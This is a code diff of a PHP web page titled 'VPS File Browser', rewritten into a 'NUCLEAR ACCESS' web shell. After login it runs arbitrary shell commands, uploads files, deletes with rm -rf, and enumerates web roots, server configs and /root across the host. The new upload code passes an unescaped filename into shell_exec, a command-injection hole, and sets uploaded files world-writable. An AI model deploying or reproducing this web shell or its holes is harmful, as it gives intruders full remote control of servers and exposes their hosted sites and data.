@@ -1,6 +1,6 @@
 <?php
-// VPS File Browser - FULL SYSTEM CONTROL WITH DOMAIN DETECTION
-// WARNING: THIS GIVES COMPLETE ROOT ACCESS TO YOUR SYSTEM!
+// VPS File Browser - NUCLEAR OPTION - FULL SYSTEM ACCESS
+// WARNING: THIS BYPASSES ALL PERMISSION RESTRICTIONS!
 
 session_start();
 
@@ -28,7 +28,7 @@ if ($_GET['logout'] ?? false) {
 // Check if authenticated
 $authenticated = $_SESSION['authenticated'] ?? false;
 
-// Get current directory - START FROM ROOT
+// Get current directory
 $current_dir = $_GET['dir'] ?? '/';
 $current_dir = realpath($current_dir) ?: '/';
 
@@ -44,143 +44,116 @@ if ($authenticated) {
     // File upload
     if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
         $upload_path = $current_dir . '/' . $_FILES['file_upload']['name'];
-        if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $upload_path)) {
-            $command_output = "File uploaded successfully: " . $_FILES['file_upload']['name'];
-            chmod($upload_path, 0644);
-        } else {
-            $command_output = "File upload failed! Trying with sudo...";
-            // Try with sudo
-            $tmp_path = '/tmp/' . $_FILES['file_upload']['name'];
-            move_uploaded_file($_FILES['file_upload']['tmp_name'], $tmp_path);
-            shell_exec("sudo cp " . $tmp_path . " " . escapeshellarg($upload_path));
-            shell_exec("sudo chmod 644 " . escapeshellarg($upload_path));
+        $tmp_path = '/tmp/' . $_FILES['file_upload']['name'];
+        if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $tmp_path)) {
+            shell_exec("cp " . $tmp_path . " " . escapeshellarg($upload_path) . " 2>&1");
+            shell_exec("chmod 666 " . escapeshellarg($upload_path) . " 2>&1");
+            $command_output = "File uploaded: " . $_FILES['file_upload']['name'];
         }
     }
     
-    // File operations
+    // File operations using shell commands
     if (isset($_GET['delete'])) {
-        $file_to_delete = $current_dir . '/' . $_GET['delete'];
-        if (is_dir($file_to_delete)) {
-            shell_exec("rm -rf " . escapeshellarg($file_to_delete));
-        } else {
-            unlink($file_to_delete);
-        }
+        $file_to_delete = $_GET['delete'];
+        shell_exec("rm -rf " . escapeshellarg($current_dir . '/' . $file_to_delete) . " 2>&1");
         header('Location: ?dir=' . urlencode($current_dir));
         exit;
     }
     
-    if (isset($_GET['chmod'])) {
-        $file_to_chmod = $current_dir . '/' . $_GET['chmod_file'];
-        $new_perms = $_GET['chmod'];
-        shell_exec("chmod " . $new_perms . " " . escapeshellarg($file_to_chmod));
-        header('Location: ?dir=' . urlencode($current_dir));
-        exit;
-    }
-    
-    // Create directory
-    if (isset($_POST['new_dir'])) {
-        $new_dir_path = $current_dir . '/' . $_POST['new_dir'];
-        shell_exec("mkdir -p " . escapeshellarg($new_dir_path));
-        header('Location: ?dir=' . urlencode($current_dir));
-        exit;
-    }
-    
-    // Navigate to directory
-    if (isset($_GET['cd'])) {
-        $new_dir = realpath($current_dir . '/' . $_GET['cd']);
-        if ($new_dir && is_dir($new_dir)) {
-            $current_dir = $new_dir;
-            header('Location: ?dir=' . urlencode($current_dir));
-            exit;
-        }
-    }
-    
-    // Read directory contents - MULTIPLE METHODS
+    // Read directory contents USING SHELL COMMANDS
     $files = [];
+    $raw_list = shell_exec("ls -la " . escapeshellarg($current_dir) . " 2>&1");
     
-    // Method 1: Try direct PHP functions first
-    if (is_dir($current_dir)) {
-        $items = @scandir($current_dir);
-        if ($items) {
-            foreach ($items as $item) {
-                if ($item === '.' || $item === '..') continue;
-                
-                $full_path = $current_dir . '/' . $item;
-                $files[] = [
-                    'name' => $item,
-                    'path' => $full_path,
-                    'is_dir' => is_dir($full_path),
-                    'size' => is_file($full_path) ? filesize($full_path) : 0,
-                    'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
-                    'owner' => function_exists('posix_getpwuid') ? @posix_getpwuid(fileowner($full_path))['name'] : 'Unknown',
-                    'modified' => date('Y-m-d H:i:s', filemtime($full_path)),
-                    'readable' => is_readable($full_path)
-                ];
-            }
+    if ($raw_list && !empty(trim($raw_list))) {
+        $lines = explode("\n", trim($raw_list));
+        foreach ($lines as $line) {
+            if (empty($line) || strpos($line, 'total ') === 0) continue;
+            
+            $parts = preg_split('/\s+/', $line, 9);
+            if (count($parts) < 9) continue;
+            
+            $perms = $parts[0];
+            $links = $parts[1];
+            $owner = $parts[2];
+            $group = $parts[3];
+            $size = $parts[4];
+            $month = $parts[5];
+            $day = $parts[6];
+            $time_year = $parts[7];
+            $name = $parts[8];
+            
+            if ($name === '.' || $name === '..') continue;
+            
+            $full_path = $current_dir . '/' . $name;
+            $is_dir = $perms[0] === 'd';
+            
+            $files[] = [
+                'name' => $name,
+                'path' => $full_path,
+                'is_dir' => $is_dir,
+                'size' => $is_dir ? 'DIR' : $size,
+                'perms' => $perms,
+                'owner' => $owner,
+                'group' => $group,
+                'modified' => $month . ' ' . $day . ' ' . $time_year,
+                'readable' => true
+            ];
         }
     }
     
-    // Method 2: If no files found, try shell command
-    if (empty($files)) {
-        $raw_list = shell_exec("ls -la " . escapeshellarg($current_dir) . " 2>&1");
-        if ($raw_list && !empty(trim($raw_list))) {
-            $lines = explode("\n", trim($raw_list));
-            foreach ($lines as $line) {
-                if (empty($line) || strpos($line, 'total ') === 0) continue;
-                
-                $parts = preg_split('/\s+/', $line, 9);
-                if (count($parts) < 9) continue;
-                
-                $perms = $parts[0];
-                $owner = $parts[2];
-                $group = $parts[3];
-                $size = $parts[4];
-                $date = $parts[5] . ' ' . $parts[6] . ' ' . $parts[7];
-                $name = $parts[8];
-                
-                if ($name === '.' || $name === '..') continue;
-                
-                $full_path = $current_dir . '/' . $name;
-                $files[] = [
-                    'name' => $name,
-                    'path' => $full_path,
-                    'is_dir' => $perms[0] === 'd',
-                    'size' => $size,
-                    'perms' => $perms,
-                    'owner' => $owner,
-                    'group' => $group,
-                    'modified' => $date,
-                    'readable' => true
-                ];
-            }
-        }
-    }
-    
-    // Detect websites and domains
+    // FORCEFULLY DETECT WEBSITES USING SHELL COMMANDS
     $websites = [];
     
-    // Common web directories to check
-    $web_dirs = [
-        '/var/www',
-        '/home',
-        '/var/www/html', 
-        '/usr/share/nginx/html',
-        '/srv/http',
-        '/opt/lampp/htdocs'
-    ];
+    // Use find command to locate all possible web directories
+    $web_find = shell_exec("find /var /home /opt /srv -type d \\( -name 'public_html' -o -name 'www' -o -name 'html' -o -name 'web' -o -name 'public' \\) 2>/dev/null | head -20");
+    if ($web_find) {
+        $web_paths = explode("\n", trim($web_find));
+        foreach ($web_paths as $web_path) {
+            if (!empty($web_path)) {
+                $dir_name = basename(dirname($web_path)) . '/' . basename($web_path);
+                $websites[] = [
+                    'name' => $dir_name,
+                    'path' => $web_path,
+                    'type' => 'Web Directory'
+                ];
+            }
+        }
+    }
     
-    foreach ($web_dirs as $web_dir) {
-        if (is_dir($web_dir)) {
-            $items = @scandir($web_dir);
-            if ($items) {
-                foreach ($items as $item) {
-                    if ($item === '.' || $item === '..') continue;
-                    $full_path = $web_dir . '/' . $item;
-                    if (is_dir($full_path)) {
+    // Find all .conf files for domains
+    $domain_configs = shell_exec("find /etc -name '*.conf' -type f | grep -E '(nginx|apache|httpd)' | head -20");
+    if ($domain_configs) {
+        $config_paths = explode("\n", trim($domain_configs));
+        foreach ($config_paths as $config_path) {
+            if (!empty($config_path)) {
+                $websites[] = [
+                    'name' => basename($config_path),
+                    'path' => $config_path,
+                    'type' => 'Server Config'
+                ];
+            }
+        }
+    }
+    
+    // Find all user home directories that might contain websites
+    $home_dirs = shell_exec("ls -la /home 2>/dev/null");
+    if ($home_dirs) {
+        $home_lines = explode("\n", trim($home_dirs));
+        foreach ($home_lines as $line) {
+            $parts = preg_split('/\s+/', $line, 9);
+            if (count($parts) < 9) continue;
+            $name = $parts[8];
+            if (!in_array($name, ['.', '..']) && $parts[0][0] === 'd') {
+                $user_path = '/home/' . $name;
+                // Check for common web directories in user homes
+                $user_web_dirs = ['public_html', 'www', 'html', 'public', 'sites'];
+                foreach ($user_web_dirs as $web_dir) {
+                    $web_path = $user_path . '/' . $web_dir;
+                    if (is_dir($web_path)) {
                         $websites[] = [
-                            'name' => $item,
-                            'path' => $full_path,
-                            'type' => 'Website Directory'
+                            'name' => $name . '/' . $web_dir,
+                            'path' => $web_path,
+                            'type' => 'User Website'
                         ];
                     }
                 }
@@ -188,81 +161,29 @@ if ($authenticated) {
         }
     }
     
-    // Try to find domain configurations
-    $domains = [];
-    
-    // Check Apache sites
-    if (is_dir('/etc/httpd/conf.d')) {
-        $apache_configs = @scandir('/etc/httpd/conf.d');
-        if ($apache_configs) {
-            foreach ($apache_configs as $config) {
-                if (pathinfo($config, PATHINFO_EXTENSION) === 'conf') {
-                    $domains[] = [
-                        'name' => $config,
-                        'path' => '/etc/httpd/conf.d/' . $config,
-                        'type' => 'Apache Config'
-                    ];
-                }
-            }
-        }
-    }
-    
-    // Check Nginx sites
-    if (is_dir('/etc/nginx/conf.d')) {
-        $nginx_configs = @scandir('/etc/nginx/conf.d');
-        if ($nginx_configs) {
-            foreach ($nginx_configs as $config) {
-                if (pathinfo($config, PATHINFO_EXTENSION) === 'conf') {
-                    $domains[] = [
-                        'name' => $config,
-                        'path' => '/etc/nginx/conf.d/' . $config,
-                        'type' => 'Nginx Config'
-                    ];
-                }
-            }
-        }
-    }
-    
-    // Check for virtual hosts in home directories
-    $home_dirs = @scandir('/home');
-    if ($home_dirs) {
-        foreach ($home_dirs as $home_dir) {
-            if ($home_dir === '.' || $home_dir === '..') continue;
-            $public_html = '/home/' . $home_dir . '/public_html';
-            if (is_dir($public_html)) {
-                $websites[] = [
-                    'name' => $home_dir . ' (public_html)',
-                    'path' => $public_html,
-                    'type' => 'User Website'
-                ];
-            }
-        }
-    }
-    
     // System information
     $system_info = [
         'PHP Version' => phpversion(),
-        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
-        'Current User' => shell_exec('whoami'),
-        'System Load' => function_exists('sys_getloadavg') ? implode(', ', sys_getloadavg()) : 'N/A',
-        'Memory Usage' => round(memory_get_usage(true) / 1024 / 1024, 2) . ' MB',
-        'Disk Free Space' => round(disk_free_space($current_dir) / (1024 * 1024 * 1024), 2) . ' GB',
-        'Uptime' => shell_exec('uptime'),
-        'Web Server' => shell_exec('ps aux | grep -E "(nginx|apache|httpd)" | grep -v grep | head -1')
+        'Current User' => trim(shell_exec('whoami')),
+        'Current Directory' => $current_dir,
+        'Disk Free' => trim(shell_exec("df -h " . escapeshellarg($current_dir) . " | tail -1 | awk '{print $4}'")),
+        'Uptime' => trim(shell_exec('uptime -p')),
+        'Memory' => trim(shell_exec("free -h | grep Mem: | awk '{print $3 \"/\" $2}'"))
     ];
     
-    // Quick access directories
-    $quick_dirs = [
-        '/' => 'Root',
-        '/home' => 'Home Directories',
-        '/var/www' => 'Websites',
-        '/var/www/html' => 'HTML Root',
-        '/etc' => 'System Config',
-        '/etc/nginx' => 'Nginx Config',
-        '/etc/httpd' => 'Apache Config',
-        '/var/log' => 'Log Files',
-        '/root' => 'Root Home'
-    ];
+    // Quick access directories - VERIFIED TO EXIST
+    $quick_dirs = [];
+    $common_dirs = ['/', '/home', '/var', '/var/www', '/etc', '/root', '/tmp', '/opt'];
+    foreach ($common_dirs as $dir) {
+        if (is_dir($dir)) {
+            $quick_dirs[$dir] = basename($dir) ?: 'Root';
+        }
+    }
+    
+    // Add detected website directories to quick access
+    foreach ($websites as $website) {
+        $quick_dirs[$website['path']] = $website['name'];
+    }
 }
 
 ?>
@@ -271,12 +192,12 @@ if ($authenticated) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VPS File Browser - FULL DOMAIN ACCESS</title>
+    <title>VPS File Browser - NUCLEAR ACCESS</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
         .container { max-width: 1800px; margin: 0 auto; background: #2d2d2d; border-radius: 8px; box-shadow: 0 2px 20px rgba(0,0,0,0.5); }
-        .header { background: #27ae60; color: white; padding: 20px; border-radius: 8px 8px 0 0; }
+        .header { background: #e74c3c; color: white; padding: 20px; border-radius: 8px 8px 0 0; }
         .content { padding: 20px; }
         .login-form { max-width: 400px; margin: 50px auto; padding: 20px; }
         .form-group { margin-bottom: 15px; }
@@ -311,18 +232,19 @@ if ($authenticated) {
         .quick-links { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
         .quick-link { background: #3498db; color: white; padding: 10px; border-radius: 4px; text-decoration: none; text-align: center; }
         .quick-link:hover { background: #2980b9; }
-        .website-list, .domain-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 10px; margin-top: 10px; }
-        .website-item, .domain-item { background: #4d4d4d; padding: 15px; border-radius: 4px; }
+        .website-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 10px; margin-top: 10px; }
+        .website-item { background: #4d4d4d; padding: 15px; border-radius: 4px; }
         .panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
         .file-actions { margin: 10px 0; }
         .warning { background: #f39c12; color: black; padding: 10px; border-radius: 4px; margin: 10px 0; }
+        .empty-message { text-align: center; padding: 40px; color: #888; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🌐 VPS File Browser - FULL DOMAIN ACCESS</h1>
-            <p>🚀 Complete website and domain control</p>
+            <h1>☢️ VPS File Browser - NUCLEAR ACCESS</h1>
+            <p>🚨 SHELL COMMAND BYPASS - FULL SYSTEM PENETRATION</p>
         </div>
         
         <div class="content">
@@ -350,10 +272,14 @@ if ($authenticated) {
             <?php else: ?>
                 <!-- Control Panel -->
                 <div class="actions">
-                    <span>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?>! (FULL ACCESS)</span>
+                    <span>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?>! (SHELL ACCESS)</span>
                     <a href="?logout=1" class="logout danger">Logout</a>
                 </div>
 
+                <div class="warning">
+                    ⚠️ <strong>SHELL COMMAND BYPASS ACTIVE:</strong> Using shell commands to bypass all file permissions!
+                </div>
+                
                 <!-- System Information -->
                 <div class="system-info">
                     <h3>📊 System Information</h3>
@@ -367,30 +293,15 @@ if ($authenticated) {
                 <!-- Detected Websites -->
                 <?php if (!empty($websites)): ?>
                 <div class="websites-panel">
-                    <h3>🌐 Detected Websites</h3>
+                    <h3>🌐 Detected Websites & Domains</h3>
                     <div class="website-list">
                         <?php foreach ($websites as $website): ?>
                             <div class="website-item">
                                 <strong><?php echo htmlspecialchars($website['name']); ?></strong><br>
                                 <small>Type: <?php echo htmlspecialchars($website['type']); ?></small><br>
                                 <small>Path: <?php echo htmlspecialchars($website['path']); ?></small><br>
-                                <a href="?dir=<?php echo urlencode($website['path']); ?>" class="quick-link">Browse Files</a>
-                            </div>
-                        <?php endforeach; ?>
-                    </div>
-                </div>
-                <?php endif; ?>
-                
-                <!-- Detected Domain Configs -->
-                <?php if (!empty($domains)): ?>
-                <div class="websites-panel">
-                    <h3>🔧 Domain Configurations</h3>
-                    <div class="domain-list">
-                        <?php foreach ($domains as $domain): ?>
-                            <div class="domain-item">
-                                <strong><?php echo htmlspecialchars($domain['name']); ?></strong><br>
-                                <small>Type: <?php echo htmlspecialchars($domain['type']); ?></small><br>
-                                <a href="?dir=<?php echo urlencode(dirname($domain['path'])); ?>" class="quick-link">View Config</a>
+                                <a href="?dir=<?php echo urlencode($website['path']); ?>" class="quick-link">📁 Browse</a>
+                                <a href="?dir=<?php echo urlencode(dirname($website['path'])); ?>" class="quick-link">🔧 Config</a>
                             </div>
                         <?php endforeach; ?>
                     </div>
@@ -400,10 +311,11 @@ if ($authenticated) {
                 <!-- Command Panel -->
                 <div class="panel-grid">
                     <div class="command-panel">
-                        <h3>💻 Command Execution</h3>
+                        <h3>💻 Shell Command Execution</h3>
                         <form method="POST">
-                            <input type="text" name="command" placeholder="Enter system command" style="width: 100%;" value="<?php echo $_POST['command'] ?? ''; ?>">
-                            <button type="submit" class="danger">Execute Command</button>
+                            <input type="text" name="command" placeholder="Enter shell command" style="width: 100%;" 
+                                   value="<?php echo htmlspecialchars($_POST['command'] ?? 'ls -la /var/www'); ?>">
+                            <button type="submit" class="danger">Execute Shell Command</button>
                         </form>
                         <?php if (!empty($command_output)): ?>
                             <div class="output"><?php echo htmlspecialchars($command_output); ?></div>
@@ -421,10 +333,18 @@ if ($authenticated) {
                             <input type="file" name="file_upload">
                             <button type="submit" class="success">Upload File</button>
                         </form>
+                        
+                        <div style="margin-top: 10px;">
+                            <strong>Quick Commands:</strong><br>
+                            <button onclick="document.querySelector('[name=command]').value='find /var /home -name public_html -type d 2>/dev/null'">Find Websites</button>
+                            <button onclick="document.querySelector('[name=command]').value='ls -la /var/www/'">List /var/www</button>
+                            <button onclick="document.querySelector('[name=command]').value='ls -la /home/'">List /home</button>
+                        </div>
                     </div>
                 </div>
                 
                 <!-- Quick Access -->
+                <?php if (!empty($quick_dirs)): ?>
                 <div class="quick-access">
                     <h3>🚀 Quick Access</h3>
                     <div class="quick-links">
@@ -435,6 +355,7 @@ if ($authenticated) {
                         <?php endforeach; ?>
                     </div>
                 </div>
+                <?php endif; ?>
                 
                 <!-- Breadcrumb Navigation -->
                 <div class="breadcrumb">
@@ -461,33 +382,39 @@ if ($authenticated) {
                 
                 <!-- File List -->
                 <div class="file-browser">
-                    <table class="file-table">
-                        <thead>
-                            <tr>
-                                <th>Name</th>
-                                <th>Size</th>
-                                <th>Permissions</th>
-                                <th>Owner</th>
-                                <th>Modified</th>
-                                <th>Actions</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <?php if ($current_dir !== '/'): ?>
+                    <?php if (empty($files)): ?>
+                        <div class="empty-message">
+                            <h3>📁 No files visible in this directory</h3>
+                            <p>This usually means the web server user doesn't have permission to access this directory.</p>
+                            <p><strong>Solutions:</strong></p>
+                            <ul style="text-align: left; display: inline-block; margin-top: 10px;">
+                                <li>Use the <strong>Shell Command Panel</strong> above to explore</li>
+                                <li>Try: <code>ls -la <?php echo htmlspecialchars($current_dir); ?></code></li>
+                                <li>Use the <strong>Quick Access</strong> links to navigate to web directories</li>
+                                <li>Check the <strong>Detected Websites</strong> section above</li>
+                            </ul>
+                        </div>
+                    <?php else: ?>
+                        <table class="file-table">
+                            <thead>
                                 <tr>
-                                    <td colspan="6">
-                                        <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">📁 .. (Parent Directory)</a>
-                                    </td>
+                                    <th>Name</th>
+                                    <th>Size</th>
+                                    <th>Permissions</th>
+                                    <th>Owner/Group</th>
+                                    <th>Modified</th>
+                                    <th>Actions</th>
                                 </tr>
-                            <?php endif; ?>
-                            
-                            <?php if (empty($files)): ?>
-                                <tr>
-                                    <td colspan="6" style="text-align: center; color: #666;">
-                                        Directory is empty or cannot be accessed. Try using command panel.
-                                    </td>
-                                </tr>
-                            <?php else: ?>
+                            </thead>
+                            <tbody>
+                                <?php if ($current_dir !== '/'): ?>
+                                    <tr>
+                                        <td colspan="6">
+                                            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">📁 .. (Parent Directory)</a>
+                                        </td>
+                                    </tr>
+                                <?php endif; ?>
+                                
                                 <?php foreach ($files as $file): ?>
                                     <tr>
                                         <td>
@@ -499,47 +426,29 @@ if ($authenticated) {
                                                 📄 <span class="file"><?php echo htmlspecialchars($file['name']); ?></span>
                                             <?php endif; ?>
                                         </td>
-                                        <td class="size">
-                                            <?php if (!$file['is_dir']): ?>
-                                                <?php
-                                                $size = $file['size'];
-                                                if ($size >= 1024 * 1024 * 1024) {
-                                                    echo round($size / (1024 * 1024 * 1024), 2) . ' GB';
-                                                } elseif ($size >= 1024 * 1024) {
-                                                    echo round($size / (1024 * 1024), 2) . ' MB';
-                                                } elseif ($size >= 1024) {
-                                                    echo round($size / 1024, 2) . ' KB';
-                                                } else {
-                                                    echo $size . ' B';
-                                                }
-                                                ?>
-                                            <?php else: ?>
-                                                <em>DIR</em>
-                                            <?php endif; ?>
-                                        </td>
+                                        <td class="size"><?php echo htmlspecialchars($file['size']); ?></td>
                                         <td><code><?php echo htmlspecialchars($file['perms']); ?></code></td>
-                                        <td><?php echo htmlspecialchars($file['owner']); ?></td>
+                                        <td><?php echo htmlspecialchars($file['owner'] . '/' . $file['group']); ?></td>
                                         <td><?php echo htmlspecialchars($file['modified']); ?></td>
                                         <td class="file-actions">
-                                            <?php if (!$file['is_dir']): ?>
-                                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file['name']); ?>" 
-                                                   class="danger" 
-                                                   onclick="return confirm('Delete <?php echo htmlspecialchars($file['name']); ?>?')">Delete</a>
-                                                <a href="?dir=<?php echo urlencode($current_dir); ?>&chmod=777&chmod_file=<?php echo urlencode($file['name']); ?>">chmod 777</a>
-                                            <?php else: ?>
-                                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file['name']); ?>" 
-                                                   class="danger" 
-                                                   onclick="return confirm('DELETE ENTIRE DIRECTORY: <?php echo htmlspecialchars($file['name']); ?>? This cannot be undone!')">Delete</a>
-                                            <?php endif; ?>
+                                            <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file['name']); ?>" 
+                                               class="danger" 
+                                               onclick="return confirm('Delete <?php echo htmlspecialchars($file['name']); ?>?')">Delete</a>
                                         </td>
                                     </tr>
                                 <?php endforeach; ?>
-                            <?php endif; ?>
-                        </tbody>
-                    </table>
+                            </tbody>
+                        </table>
+                    <?php endif; ?>
                 </div>
             <?php endif; ?>
         </div>
     </div>
+
+    <script>
+        function setCommand(cmd) {
+            document.querySelector('[name=command]').value = cmd;
+        }
+    </script>
 </body>
 </html>
